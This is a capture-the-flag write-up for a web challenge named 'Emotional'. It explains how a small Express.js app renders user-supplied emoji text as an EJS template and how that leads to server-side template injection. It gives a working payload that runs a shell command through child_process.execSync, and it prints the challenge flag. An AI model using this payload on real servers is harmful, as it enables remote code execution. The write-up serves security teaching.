**Category**: Web  
**Author**: John Hammond

![](./files/01%20-%20Emotional/01%20-%20Emotional.png)

---

The challenge ZIP contained a small Express.js application using the EJS templating language.

```JavaScript
const fs = require('fs');
const ejs = require('ejs');
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let profile = {
    emoji: "😊"
};

app.post('/setEmoji', (req, res) => {
    const { emoji } = req.body;
    profile.emoji = emoji;
    res.json({ profileEmoji: emoji });
});

app.get('/', (req, res) => {
    fs.readFile(path.join(__dirname, 'views', 'index.ejs'), 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Failed to read server file. Please notify a CTF admin.');
        }
        
        try {
            const profilePage = data.replace(/<% profileEmoji %>/g, profile.emoji);
            const renderedHtml = ejs.render(profilePage, { profileEmoji: profile.emoji });
            res.send(renderedHtml);
        } catch (renderErr) {
            res.send("An error occurred: " + renderErr)
        }
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
```

Input was being directly included in the template prior to rendering. This could result in [SSTI](https://portswigger.net/web-security/server-side-template-injection) if the EJS version was vulnerable, which `package.json` confirmed:

```JSON
{
  "name": "emoji_profile",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "keywords": [],
  "description": "",
  "dependencies": {
    "ejs": "^3.1.9",
    "express": "^4.18.2"
  }
}
```

EJS v3.1.9 in particular is vulnerable to [CVE-2023-29827](https://github.com/mde/ejs/issues/720). I set my emoji to the following payload in Burp Repeater:

```JavaScript
<%= process.mainModule.require('child_process').execSync('cat flag.txt') %>
```

Requesting the main page then triggered my SSTI payload and returned the flag:

![](./files/01%20-%20Emotional/01.png)

Flag: **flag{8c8e0e59d1292298b64c625b401e8cfa}**

---

**Files:**
- [emotional.zip](./files//01%20-%20Emotional/emotional.zip)